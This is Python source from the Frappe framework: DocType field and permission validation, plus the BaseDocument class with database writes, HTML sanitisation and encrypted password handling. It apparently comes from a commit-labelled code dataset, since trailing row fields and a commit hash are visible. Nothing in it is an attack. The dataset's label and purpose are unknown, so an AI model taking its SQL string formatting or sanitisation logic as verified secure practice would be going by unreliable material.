	def check_sort_field(meta):
		'''Validate that sort_field(s) is a valid field'''
		if meta.sort_field:
			sort_fields = [meta.sort_field]
			if ','  in meta.sort_field:
				sort_fields = [d.split()[0] for d in meta.sort_field.split(',')]

			for fieldname in sort_fields:
				if not fieldname in fieldname_list + list(default_fields):
					frappe.throw(_(""Sort field {0} must be a valid fieldname"").format(fieldname),
						InvalidFieldNameError)

	def check_illegal_depends_on_conditions(docfield):
		''' assignment operation should not be allowed in the depends on condition.'''
		depends_on_fields = [""depends_on"", ""collapsible_depends_on""]
		for field in depends_on_fields:
			depends_on = docfield.get(field, None)
			if depends_on and (""="" in depends_on) and \
				re.match(""""""[\w\.:_]+\s*={1}\s*[\w\.@'""]+"""""", depends_on):
				frappe.throw(_(""Invalid {0} condition"").format(frappe.unscrub(field)), frappe.ValidationError)

	def scrub_options_in_select(field):
		""""""Strip options for whitespaces""""""

		if field.fieldtype == ""Select"" and field.options is not None:
			options_list = []
			for i, option in enumerate(field.options.split(""\n"")):
				_option = option.strip()
				if i==0 or _option:
					options_list.append(_option)
			field.options = '\n'.join(options_list)

	def scrub_fetch_from(field):
		if hasattr(field, 'fetch_from') and getattr(field, 'fetch_from'):
			field.fetch_from = field.fetch_from.strip('\n').strip()

	fields = meta.get(""fields"")
	fieldname_list = [d.fieldname for d in fields]

	not_allowed_in_list_view = list(copy.copy(no_value_fields))
	not_allowed_in_list_view.append(""Attach Image"")
	if meta.istable:
		not_allowed_in_list_view.remove('Button')

	for d in fields:
		if not d.permlevel: d.permlevel = 0
		if d.fieldtype != ""Table"": d.allow_bulk_edit = 0
		if not d.fieldname:
			d.fieldname = d.fieldname.lower()

		check_illegal_characters(d.fieldname)
		check_unique_fieldname(meta.get(""name""), d.fieldname)
		check_fieldname_length(d.fieldname)
		check_illegal_mandatory(meta.get(""name""), d)
		check_link_table_options(meta.get(""name""), d)
		check_dynamic_link_options(d)
		check_hidden_and_mandatory(meta.get(""name""), d)
		check_in_list_view(d)
		check_in_global_search(d)
		check_illegal_default(d)
		check_unique_and_text(meta.get(""name""), d)
		check_illegal_depends_on_conditions(d)
		scrub_options_in_select(d)
		scrub_fetch_from(d)

	check_fold(fields)
	check_search_fields(meta, fields)
	check_title_field(meta)
	check_timeline_field(meta)
	check_is_published_field(meta)
	check_sort_field(meta)
	check_image_field(meta)

def validate_permissions_for_doctype(doctype, for_remove=False):
	""""""Validates if permissions are set correctly.""""""
	doctype = frappe.get_doc(""DocType"", doctype)
	validate_permissions(doctype, for_remove)

	# save permissions
	for perm in doctype.get(""permissions""):
		perm.db_update()

	clear_permissions_cache(doctype.name)

def clear_permissions_cache(doctype):
	frappe.clear_cache(doctype=doctype)
	delete_notification_count_for(doctype)
	for user in frappe.db.sql_list(""""""select
			distinct `tabHas Role`.parent
		from
			`tabHas Role`,
		tabDocPerm
			where tabDocPerm.parent = %s
			and tabDocPerm.role = `tabHas Role`.role"""""", doctype):
		frappe.clear_cache(user=user)

def validate_permissions(doctype, for_remove=False):
	permissions = doctype.get(""permissions"")
	if not permissions:
		frappe.msgprint(_('No Permissions Specified'), alert=True, indicator='orange')
	issingle = issubmittable = isimportable = False
	if doctype:
		issingle = cint(doctype.issingle)
		issubmittable = cint(doctype.is_submittable)
		isimportable = cint(doctype.allow_import)

	def get_txt(d):
		return _(""For {0} at level {1} in {2} in row {3}"").format(d.role, d.permlevel, d.parent, d.idx)

	def check_atleast_one_set(d):
		if not d.read and not d.write and not d.submit and not d.cancel and not d.create:
			frappe.throw(_(""{0}: No basic permissions set"").format(get_txt(d)))

	def check_double(d):
		has_similar = False
		similar_because_of = """"
		for p in permissions:
			if p.role==d.role and p.permlevel==d.permlevel and p!=d:
				if p.if_owner==d.if_owner:
					similar_because_of = _(""If Owner"")
					has_similar = True
					break

		if has_similar:
			frappe.throw(_(""{0}: Only one rule allowed with the same Role, Level and {1}"")\
				.format(get_txt(d),	similar_because_of))

	def check_level_zero_is_set(d):
		if cint(d.permlevel) > 0 and d.role != 'All':
			has_zero_perm = False
			for p in permissions:
				if p.role==d.role and (p.permlevel or 0)==0 and p!=d:
					has_zero_perm = True
					break

			if not has_zero_perm:
				frappe.throw(_(""{0}: Permission at level 0 must be set before higher levels are set"").format(get_txt(d)))

			for invalid in (""create"", ""submit"", ""cancel"", ""amend""):
				if d.get(invalid): d.set(invalid, 0)

	def check_permission_dependency(d):
		if d.cancel and not d.submit:
			frappe.throw(_(""{0}: Cannot set Cancel without Submit"").format(get_txt(d)))

		if (d.submit or d.cancel or d.amend) and not d.write:
			frappe.throw(_(""{0}: Cannot set Submit, Cancel, Amend without Write"").format(get_txt(d)))
		if d.amend and not d.write:
			frappe.throw(_(""{0}: Cannot set Amend without Cancel"").format(get_txt(d)))
		if d.get(""import"") and not d.create:
			frappe.throw(_(""{0}: Cannot set Import without Create"").format(get_txt(d)))

	def remove_rights_for_single(d):
		if not issingle:
			return

		if d.report:
			frappe.msgprint(_(""Report cannot be set for Single types""))
			d.report = 0
			d.set(""import"", 0)
			d.set(""export"", 0)

		for ptype, label in [[""set_user_permissions"", _(""Set User Permissions"")]]:
			if d.get(ptype):
				d.set(ptype, 0)
				frappe.msgprint(_(""{0} cannot be set for Single types"").format(label))

	def check_if_submittable(d):
		if d.submit and not issubmittable:
			frappe.throw(_(""{0}: Cannot set Assign Submit if not Submittable"").format(get_txt(d)))
		elif d.amend and not issubmittable:
			frappe.throw(_(""{0}: Cannot set Assign Amend if not Submittable"").format(get_txt(d)))

	def check_if_importable(d):
		if d.get(""import"") and not isimportable:
			frappe.throw(_(""{0}: Cannot set import as {1} is not importable"").format(get_txt(d), doctype))

	for d in permissions:
		if not d.permlevel:
			d.permlevel=0
		check_atleast_one_set(d)
		if not for_remove:
			check_double(d)
			check_permission_dependency(d)
			check_if_submittable(d)
			check_if_importable(d)
		check_level_zero_is_set(d)
		remove_rights_for_single(d)

def make_module_and_roles(doc, perm_fieldname=""permissions""):
	""""""Make `Module Def` and `Role` records if already not made. Called while installing.""""""
	try:
		if hasattr(doc,'restrict_to_domain') and doc.restrict_to_domain and \
			not frappe.db.exists('Domain', doc.restrict_to_domain):
			frappe.get_doc(dict(doctype='Domain', domain=doc.restrict_to_domain)).insert()

		if not frappe.db.exists(""Module Def"", doc.module):
			m = frappe.get_doc({""doctype"": ""Module Def"", ""module_name"": doc.module})
			m.app_name = frappe.local.module_app[frappe.scrub(doc.module)]
			m.flags.ignore_mandatory = m.flags.ignore_permissions = True
			m.insert()

		default_roles = [""Administrator"", ""Guest"", ""All""]
		roles = [p.role for p in doc.get(""permissions"") or []] + default_roles

		for role in list(set(roles)):
			if not frappe.db.exists(""Role"", role):
				r = frappe.get_doc(dict(doctype= ""Role"", role_name=role, desk_access=1))
				r.flags.ignore_mandatory = r.flags.ignore_permissions = True
				r.insert()
	except frappe.DoesNotExistError as e:
		pass
	except frappe.SQLError as e:
		if e.args[0]==1146:
			pass
		else:
			raise

def init_list(doctype):
	""""""Make boilerplate list views.""""""
	doc = frappe.get_meta(doctype)
	make_boilerplate(""controller_list.js"", doc)
	make_boilerplate(""controller_list.html"", doc)

def check_if_fieldname_conflicts_with_methods(doctype, fieldname):
	doc = frappe.get_doc({""doctype"": doctype})
	method_list = [method for method in dir(doc) if isinstance(method, str) and callable(getattr(doc, method))]

	if fieldname in method_list:
		frappe.throw(_(""Fieldname {0} conflicting with meta object"").format(fieldname))

def clear_linked_doctype_cache():
	frappe.cache().delete_value('linked_doctypes_without_ignore_user_permissions_enabled')
/n/n/nfrappe/model/base_document.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
from six import iteritems, string_types
import datetime
import frappe, sys
from frappe import _
from frappe.utils import (cint, flt, now, cstr, strip_html,
	sanitize_html, sanitize_email, cast_fieldtype)
from frappe.model import default_fields
from frappe.model.naming import set_new_name
from frappe.model.utils.link_count import notify_link_count
from frappe.modules import load_doctype_module
from frappe.model import display_fieldtypes
from frappe.model.db_schema import type_map, varchar_len
from frappe.utils.password import get_decrypted_password, set_encrypted_password

_classes = {}

def get_controller(doctype):
	""""""Returns the **class** object of the given DocType.
	For `custom` type, returns `frappe.model.document.Document`.

	:param doctype: DocType name as string.""""""
	from frappe.model.document import Document
	global _classes

	if not doctype in _classes:
		module_name, custom = frappe.db.get_value(""DocType"", doctype, (""module"", ""custom""), cache=True) \
			or [""Core"", False]

		if custom:
			_class = Document
		else:
			module = load_doctype_module(doctype, module_name)
			classname = doctype.replace("" "", """").replace(""-"", """")
			if hasattr(module, classname):
				_class = getattr(module, classname)
				if issubclass(_class, BaseDocument):
					_class = getattr(module, classname)
				else:
					raise ImportError(doctype)
			else:
				raise ImportError(doctype)
		_classes[doctype] = _class

	return _classes[doctype]

class BaseDocument(object):
	ignore_in_getter = (""doctype"", ""_meta"", ""meta"", ""_table_fields"", ""_valid_columns"")

	def __init__(self, d):
		self.update(d)
		self.dont_update_if_missing = []

		if hasattr(self, ""__setup__""):
			self.__setup__()

	@property
	def meta(self):
		if not hasattr(self, ""_meta""):
			self._meta = frappe.get_meta(self.doctype)

		return self._meta

	def update(self, d):
		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))

		# first set default field values of base document
		for key in default_fields:
			if key in d:
				self.set(key, d.get(key))

		for key, value in iteritems(d):
			self.set(key, value)

		return self

	def update_if_missing(self, d):
		if isinstance(d, BaseDocument):
			d = d.get_valid_dict()

		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))
		for key, value in iteritems(d):
			# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value
			if (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):
				self.set(key, value)

	def get_db_value(self, key):
		return frappe.db.get_value(self.doctype, self.name, key)

	def get(self, key=None, filters=None, limit=None, default=None):
		if key:
			if isinstance(key, dict):
				return _filter(self.get_all_children(), key, limit=limit)
			if filters:
				if isinstance(filters, dict):
					value = _filter(self.__dict__.get(key, []), filters, limit=limit)
				else:
					default = filters
					filters = None
					value = self.__dict__.get(key, default)
			else:
				value = self.__dict__.get(key, default)

			if value is None and key not in self.ignore_in_getter \
				and key in (d.fieldname for d in self.meta.get_table_fields()):
				self.set(key, [])
				value = self.__dict__.get(key)

			return value
		else:
			return self.__dict__

	def getone(self, key, filters=None):
		return self.get(key, filters=filters, limit=1)[0]

	def set(self, key, value, as_value=False):
		if isinstance(value, list) and not as_value:
			self.__dict__[key] = []
			self.extend(key, value)
		else:
			self.__dict__[key] = value

	def delete_key(self, key):
		if key in self.__dict__:
			del self.__dict__[key]

	def append(self, key, value=None):
		if value==None:
			value={}
		if isinstance(value, (dict, BaseDocument)):
			if not self.__dict__.get(key):
				self.__dict__[key] = []
			value = self._init_child(value, key)
			self.__dict__[key].append(value)

			# reference parent document
			value.parent_doc = self

			return value
		else:

			# metaclasses may have arbitrary lists
			# which we can ignore
			if (getattr(self, '_metaclass', None)
				or self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):
				return value

			raise ValueError(
				'Document for field ""{0}"" attached to child table of ""{1}"" must be a dict or BaseDocument, not {2} ({3})'.format(key,
					self.name, str(type(value))[1:-1], value)
			)

	def extend(self, key, value):
		if isinstance(value, list):
			for v in value:
				self.append(key, v)
		else:
			raise ValueError

	def remove(self, doc):
		self.get(doc.parentfield).remove(doc)

	def _init_child(self, value, key):
		if not self.doctype:
			return value
		if not isinstance(value, BaseDocument):
			if ""doctype"" not in value:
				value[""doctype""] = self.get_table_field_doctype(key)
				if not value[""doctype""]:
					raise AttributeError(key)
			value = get_controller(value[""doctype""])(value)
			value.init_valid_columns()

		value.parent = self.name
		value.parenttype = self.doctype
		value.parentfield = key

		if value.docstatus is None:
			value.docstatus = 0

		if not getattr(value, ""idx"", None):
			value.idx = len(self.get(key) or []) + 1

		if not getattr(value, ""name"", None):
			value.__dict__['__islocal'] = 1

		return value

	def get_valid_dict(self, sanitize=True, convert_dates_to_str=False):
		d = frappe._dict()
		for fieldname in self.meta.get_valid_columns():
			d[fieldname] = self.get(fieldname)

			# if no need for sanitization and value is None, continue
			if not sanitize and d[fieldname] is None:
				continue

			df = self.meta.get_field(fieldname)
			if df:
				if df.fieldtype==""Check"":
					if d[fieldname]==None:
						d[fieldname] = 0

					elif (not isinstance(d[fieldname], int) or d[fieldname] > 1):
						d[fieldname] = 1 if cint(d[fieldname]) else 0

				elif df.fieldtype==""Int"" and not isinstance(d[fieldname], int):
					d[fieldname] = cint(d[fieldname])

				elif df.fieldtype in (""Currency"", ""Float"", ""Percent"") and not isinstance(d[fieldname], float):
					d[fieldname] = flt(d[fieldname])

				elif df.fieldtype in (""Datetime"", ""Date"", ""Time"") and d[fieldname]=="""":
					d[fieldname] = None

				elif df.get(""unique"") and cstr(d[fieldname]).strip()=="""":
					# unique empty field should be set to None
					d[fieldname] = None

				if isinstance(d[fieldname], list) and df.fieldtype != 'Table':
					frappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))

				if convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):
					d[fieldname] = str(d[fieldname])

		return d

	def init_valid_columns(self):
		for key in default_fields:
			if key not in self.__dict__:
				self.__dict__[key] = None

			if key in (""idx"", ""docstatus"") and self.__dict__[key] is None:
				self.__dict__[key] = 0

		for key in self.get_valid_columns():
			if key not in self.__dict__:
				self.__dict__[key] = None

	def get_valid_columns(self):
		if self.doctype not in frappe.local.valid_columns:
			if self.doctype in (""DocField"", ""DocPerm"") and self.parent in (""DocType"", ""DocField"", ""DocPerm""):
				from frappe.model.meta import get_table_columns
				valid = get_table_columns(self.doctype)
			else:
				valid = self.meta.get_valid_columns()

			frappe.local.valid_columns[self.doctype] = valid

		return frappe.local.valid_columns[self.doctype]

	def is_new(self):
		return self.get(""__islocal"")

	def as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):
		doc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)
		doc[""doctype""] = self.doctype
		for df in self.meta.get_table_fields():
			children = self.get(df.fieldname) or []
			doc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]

		if no_nulls:
			for k in list(doc):
				if doc[k] is None:
					del doc[k]

		if no_default_fields:
			for k in list(doc):
				if k in default_fields:
					del doc[k]

		for key in (""_user_tags"", ""__islocal"", ""__onload"", ""_liked_by"", ""__run_link_triggers""):
			if self.get(key):
				doc[key] = self.get(key)

		return doc

	def as_json(self):
		return frappe.as_json(self.as_dict())

	def get_table_field_doctype(self, fieldname):
		return self.meta.get_field(fieldname).options

	def get_parentfield_of_doctype(self, doctype):
		fieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]
		return fieldname[0] if fieldname else None

	def db_insert(self):
		""""""INSERT the document (with valid columns) in the database.""""""
		if not self.name:
			# name will be set by document class in most cases
			set_new_name(self)

		if not self.creation:
			self.creation = self.modified = now()
			self.created_by = self.modifield_by = frappe.session.user

		d = self.get_valid_dict(convert_dates_to_str=True)

		columns = list(d)
		try:
			frappe.db.sql(""""""insert into `tab{doctype}`
				({columns}) values ({values})"""""".format(
					doctype = self.doctype,
					columns = "", "".join([""`""+c+""`"" for c in columns]),
					values = "", "".join([""%s""] * len(columns))
				), list(d.values()))
		except Exception as e:
			if e.args[0]==1062:
				if ""PRIMARY"" in cstr(e.args[1]):
					if self.meta.autoname==""hash"":
						# hash collision? try again
						self.name = None
						self.db_insert()
						return

					raise frappe.DuplicateEntryError(self.doctype, self.name, e)

				elif ""Duplicate"" in cstr(e.args[1]):
					# unique constraint
					self.show_unique_validation_message(e)
				else:
					raise
			else:
				raise
		self.set(""__islocal"", False)

	def db_update(self):
		if self.get(""__islocal"") or not self.name:
			self.db_insert()
			return

		d = self.get_valid_dict(convert_dates_to_str=True)

		# don't update name, as case might've been changed
		name = d['name']
		del d['name']

		columns = list(d)

		try:
			frappe.db.sql(""""""update `tab{doctype}`
				set {values} where name=%s"""""".format(
					doctype = self.doctype,
					values = "", "".join([""`""+c+""`=%s"" for c in columns])
				), list(d.values()) + [name])
		except Exception as e:
			if e.args[0]==1062 and ""Duplicate"" in cstr(e.args[1]):
				self.show_unique_validation_message(e)
			else:
				raise

	def show_unique_validation_message(self, e):
		type, value, traceback = sys.exc_info()
		fieldname, label = str(e).split(""'"")[-2], None

		# unique_first_fieldname_second_fieldname is the constraint name
		# created using frappe.db.add_unique
		if ""unique_"" in fieldname:
			fieldname = fieldname.split(""_"", 1)[1]

		df = self.meta.get_field(fieldname)
		if df:
			label = df.label

		frappe.msgprint(_(""{0} must be unique"".format(label or fieldname)))

		# this is used to preserve traceback
		raise frappe.UniqueValidationError(self.doctype, self.name, e)

	def update_modified(self):
		'''Update modified timestamp'''
		self.set(""modified"", now())
		frappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)

	def _fix_numeric_types(self):
		for df in self.meta.get(""fields""):
			if df.fieldtype == ""Check"":
				self.set(df.fieldname, cint(self.get(df.fieldname)))

			elif self.get(df.fieldname) is not None:
				if df.fieldtype == ""Int"":
					self.set(df.fieldname, cint(self.get(df.fieldname)))

				elif df.fieldtype in (""Float"", ""Currency"", ""Percent""):
					self.set(df.fieldname, flt(self.get(df.fieldname)))

		if self.docstatus is not None:
			self.docstatus = cint(self.docstatus)

	def _get_missing_mandatory_fields(self):
		""""""Get mandatory fields that do not have any values""""""
		def get_msg(df):
			if df.fieldtype == ""Table"":
				return ""{}: {}: {}"".format(_(""Error""), _(""Data missing in table""), _(df.label))

			elif self.parentfield:
				return ""{}: {} {} #{}: {}: {}"".format(_(""Error""), frappe.bold(_(self.doctype)),
					_(""Row""), self.idx, _(""Value missing for""), _(df.label))

			else:
				return _(""Error: Value missing for {0}: {1}"").format(_(df.parent), _(df.label))

		missing = []

		for df in self.meta.get(""fields"", {""reqd"": ('=', 1)}):
			if self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():
				missing.append((df.fieldname, get_msg(df)))

		# check for missing parent and parenttype
		if self.meta.istable:
			for fieldname in (""parent"", ""parenttype""):
				if not self.get(fieldname):
					missing.append((fieldname, get_msg(frappe._dict(label=fieldname))))

		return missing

	def get_invalid_links(self, is_submittable=False):
		'''Returns list of invalid links and also updates fetch values if not set'''
		def get_msg(df, docname):
			if self.parentfield:
				return ""{} #{}: {}: {}"".format(_(""Row""), self.idx, _(df.label), docname)
			else:
				return ""{}: {}"".format(_(df.label), docname)

		invalid_links = []
		cancelled_links = []

		for df in (self.meta.get_link_fields()
				+ self.meta.get(""fields"", {""fieldtype"": ('=', ""Dynamic Link"")})):
			docname = self.get(df.fieldname)

			if docname:
				if df.fieldtype==""Link"":
					doctype = df.options
					if not doctype:
						frappe.throw(_(""Options not set for link field {0}"").format(df.fieldname))
				else:
					doctype = self.get(df.options)
					if not doctype:
						frappe.throw(_(""{0} must be set first"").format(self.meta.get_label(df.options)))

				# MySQL is case insensitive. Preserve case of the original docname in the Link Field.

				# get a map of values ot fetch along with this link query
				# that are mapped as link_fieldname.source_fieldname in Options of
				# Readonly or Data or Text type fields

				fields_to_fetch = [
					_df for _df in self.meta.get_fields_to_fetch(df.fieldname)
					if
						not _df.get('fetch_if_empty')
						or (_df.get('fetch_if_empty') and not self.get(_df.fieldname))
				]

				if not fields_to_fetch:
					# cache a single value type
					values = frappe._dict(name=frappe.db.get_value(doctype, docname,
						'name', cache=True))
				else:
					values_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]
						for _df in fields_to_fetch]

					# don't cache if fetching other values too
					values = frappe.db.get_value(doctype, docname,
						values_to_fetch, as_dict=True)

				if frappe.get_meta(doctype).issingle:
					values.name = doctype

				if values:
					setattr(self, df.fieldname, values.name)

					for _df in fields_to_fetch:
						if self.is_new() or self.docstatus != 1 or _df.allow_on_submit:
							setattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])

					notify_link_count(doctype, docname)

					if not values.name:
						invalid_links.append((df.fieldname, docname, get_msg(df, docname)))

					elif (df.fieldname != ""amended_from""
						and (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable
						and cint(frappe.db.get_value(doctype, docname, ""docstatus""))==2):

						cancelled_links.append((df.fieldname, docname, get_msg(df, docname)))

		return invalid_links, cancelled_links

	def _validate_selects(self):
		if frappe.flags.in_import:
			return

		for df in self.meta.get_select_fields():
			if df.fieldname==""naming_series"" or not (self.get(df.fieldname) and df.options):
				continue

			options = (df.options or """").split(""\n"")

			# if only empty options
			if not filter(None, options):
				continue

			# strip and set
			self.set(df.fieldname, cstr(self.get(df.fieldname)).strip())
			value = self.get(df.fieldname)

			if value not in options and not (frappe.flags.in_test and value.startswith(""_T-"")):
				# show an elaborate message
				prefix = _(""Row #{0}:"").format(self.idx) if self.get(""parentfield"") else """"
				label = _(self.meta.get_label(df.fieldname))
				comma_options = '"", ""'.join(_(each) for each in options)

				frappe.throw(_('{0} {1} cannot be ""{2}"". It should be one of ""{3}""').format(prefix, label,
					value, comma_options))

	def _validate_constants(self):
		if frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:
			return

		constants = [d.fieldname for d in self.meta.get(""fields"", {""set_only_once"": ('=',1)})]
		if constants:
			values = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)

		for fieldname in constants:
			df = self.meta.get_field(fieldname)

			# This conversion to string only when fieldtype is Date
			if df.fieldtype == 'Date' or df.fieldtype == 'Datetime':
				value = str(values.get(fieldname))

			else:
				value  = values.get(fieldname)

			if self.get(fieldname) != value:
				frappe.throw(_(""Value cannot be changed for {0}"").format(self.meta.get_label(fieldname)),
					frappe.CannotChangeConstantError)

	def _validate_length(self):
		if frappe.flags.in_install:
			return

		if self.meta.issingle:
			# single doctype value type is mediumtext
			return

		column_types_to_check_length = ('varchar', 'int', 'bigint')

		for fieldname, value in iteritems(self.get_valid_dict()):
			df = self.meta.get_field(fieldname)

			if not df or df.fieldtype == 'Check':
				# skip standard fields and Check fields
				continue

			column_type = type_map[df.fieldtype][0] or None
			default_column_max_length = type_map[df.fieldtype][1] or None

			if df and df.fieldtype in type_map and column_type in column_types_to_check_length:
				max_length = cint(df.get(""length"")) or cint(default_column_max_length)

				if len(cstr(value)) > max_length:
					if self.parentfield and self.idx:
						reference = _(""{0}, Row {1}"").format(_(self.doctype), self.idx)

					else:
						reference = ""{0} {1}"".format(_(self.doctype), self.name)

					frappe.throw(_(""{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}"")\
						.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))

	def _validate_update_after_submit(self):
		# get the full doc with children
		db_values = frappe.get_doc(self.doctype, self.name).as_dict()

		for key in self.as_dict():
			df = self.meta.get_field(key)
			db_value = db_values.get(key)

			if df and not df.allow_on_submit and (self.get(key) or db_value):
				if df.fieldtype==""Table"":
					# just check if the table size has changed
					# individual fields will be checked in the loop for children
					self_value = len(self.get(key))
					db_value = len(db_value)

				else:
					self_value = self.get_value(key)

				if self_value != db_value:
					frappe.throw(_(""Not allowed to change {0} after submission"").format(df.label),
						frappe.UpdateAfterSubmitError)

	def _sanitize_content(self):
		""""""Sanitize HTML and Email in field values. Used to prevent XSS.

			- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'
		""""""
		if frappe.flags.in_install:
			return

		for fieldname, value in self.get_valid_dict().items():
			if not value or not isinstance(value, string_types):
				continue

			value = frappe.as_unicode(value)

			if (u""<"" not in value and u"">"" not in value):
				# doesn't look like html so no need
				continue

			elif ""<!-- markdown -->"" in value and not (""<script"" in value or ""javascript:"" in value):
				# should be handled separately via the markdown converter function
				continue

			df = self.meta.get_field(fieldname)
			sanitized_value = value

			if df and df.get(""fieldtype"") in (""Data"", ""Code"", ""Small Text"") and df.get(""options"")==""Email"":
				sanitized_value = sanitize_email(value)

			elif df and (df.get(""ignore_xss_filter"")
						or (df.get(""fieldtype"")==""Code"" and df.get(""options"")!=""Email"")
						or df.get(""fieldtype"") in (""Attach"", ""Attach Image"", ""Barcode"")

						# cancelled and submit but not update after submit should be ignored
						or self.docstatus==2
						or (self.docstatus==1 and not df.get(""allow_on_submit""))):
				continue

			else:
				sanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')

			self.set(fieldname, sanitized_value)

	def _save_passwords(self):
		'''Save password field values in __Auth table'''
		if self.flags.ignore_save_passwords is True:
			return

		for df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):
			if self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue
			new_password = self.get(df.fieldname)
			if new_password and not self.is_dummy_password(new_password):
				# is not a dummy password like '*****'
				set_encrypted_password(self.doctype, self.name, new_password, df.fieldname)

				# set dummy password like '*****'
				self.set(df.fieldname, '*'*len(new_password))

	def get_password(self, fieldname='password', raise_exception=True):
		if self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):
			return self.get(fieldname)

		return get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)

	def is_dummy_password(self, pwd):
		return ''.join(set(pwd))=='*'

	def precision(self, fieldname, parentfield=None):
		""""""Returns float precision for a particular field (or get global default).

		:param fieldname: Fieldname for which precision is required.
		:param parentfield: If fieldname is in child table.""""""
		from frappe.model.meta import get_field_precision

		if parentfield and not isinstance(parentfield, string_types):
			parentfield = parentfield.parentfield

		cache_key = parentfield or ""main""

		if not hasattr(self, ""_precision""):
			self._precision = frappe._dict()

		if cache_key not in self._precision:
			self._precision[cache_key] = frappe._dict()

		if fieldname not in self._precision[cache_key]:
			self._precision[cache_key][fieldname] = None

			doctype = self.meta.get_field(parentfield).options if parentfield else self.doctype
			df = frappe.get_meta(doctype).get_field(fieldname)

			if df.fieldtype in (""Currency"", ""Float"", ""Percent""):
				self._precision[cache_key][fieldname] = get_field_precision(df, self)

		return self._precision[cache_key][fieldname]


	def get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):
		from frappe.utils.formatters import format_value

		df = self.meta.get_field(fieldname)
		if not df and fieldname in default_fields:
			from frappe.model.meta import get_default_df
			df = get_default_df(fieldname)

		val = self.get(fieldname)

		if translated:
			val = _(val)

		if absolute_value and isinstance(val, (int, float)):
			val = abs(self.get(fieldname))

		if not doc:
			doc = getattr(self, ""parent_doc"", None) or self

		return format_value(val, df=df, doc=doc, currency=currency)

	def is_print_hide(self, fieldname, df=None, for_print=True):
		""""""Returns true if fieldname is to be hidden for print.

		Print Hide can be set via the Print Format Builder or in the controller as a list
		of hidden fields. Example

			class MyDoc(Document):
				def __setup__(self):
					self.print_hide = [""field1"", ""field2""]

		:param fieldname: Fieldname to be checked if hidden.
		""""""
		meta_df = self.meta.get_field(fieldname)
		if meta_df and meta_df.get(""__print_hide""):
			return True

		print_hide = 0

		if self.get(fieldname)==0 and not self.meta.istable:
			print_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )

		if not print_hide:
			if df and df.print_hide is not None:
				print_hide = df.print_hide
			elif meta_df:
				print_hide = meta_df.print_hide

		return print_hide

	def in_format_data(self, fieldname):
		""""""Returns True if shown via Print Format::`format_data` property.
			Called from within standard print format.""""""
		doc = getattr(self, ""parent_doc"", self)

		if hasattr(doc, ""format_data_map""):
			return fieldname in doc.format_data_map
		else:
			return True

	def reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):
		""""""If the user does not have permissions at permlevel > 0, then reset the values to original / default""""""
		to_reset = []

		for df in high_permlevel_fields:
			if df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:
				to_reset.append(df)

		if to_reset:
			if self.is_new():
				# if new, set default value
				ref_doc = frappe.new_doc(self.doctype)
			else:
				# get values from old doc
				if self.get('parent_doc'):
					self.parent_doc.get_latest()
					ref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]
				else:
					ref_doc = self.get_latest()

			for df in to_reset:
				self.set(df.fieldname, ref_doc.get(df.fieldname))

	def get_value(self, fieldname):
		df = self.meta.get_field(fieldname)
		val = self.get(fieldname)

		return self.cast(val, df)

	def cast(self, value, df):
		return cast_fieldtype(df.fieldtype, value)

	def _extract_images_from_text_editor(self):
		from frappe.utils.file_manager import extract_images_from_doc
		if self.doctype != ""DocType"":
			for df in self.meta.get(""fields"", {""fieldtype"": ('=', ""Text Editor"")}):
				extract_images_from_doc(self, df.fieldname)

def _filter(data, filters, limit=None):
	""""""pass filters as:
		{""key"": ""val"", ""key"": [""!="", ""val""],
		""key"": [""in"", ""val""], ""key"": [""not in"", ""val""], ""key"": ""^val"",
		""key"" : True (exists), ""key"": False (does not exist) }""""""

	out, _filters = [], {}

	if not data:
		return out

	# setup filters as tuples
	if filters:
		for f in filters:
			fval = filters[f]

			if not isinstance(fval, (tuple, list)):
				if fval is True:
					fval = (""not None"", fval)
				elif fval is False:
					fval = (""None"", fval)
				elif isinstance(fval, string_types) and fval.startswith(""^""):
					fval = (""^"", fval[1:])
				else:
					fval = (""="", fval)

			_filters[f] = fval

	for d in data:
		add = True
		for f, fval in iteritems(_filters):
			if not frappe.compare(getattr(d, f, None), fval[0], fval[1]):
				add = False
				break

		if add:
			out.append(d)
			if limit and (len(out)-1)==limit:
				break

	return out
/n/n/n",0
73,acd2f589b6cd2d1011be4a4e4965a1b3ed489c37,"/frappe/model/base_document.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
from six import iteritems, string_types
import datetime
import frappe, sys
from frappe import _
from frappe.utils import (cint, flt, now, cstr, strip_html,
	sanitize_html, sanitize_email, cast_fieldtype)
from frappe.model import default_fields
from frappe.model.naming import set_new_name
from frappe.model.utils.link_count import notify_link_count
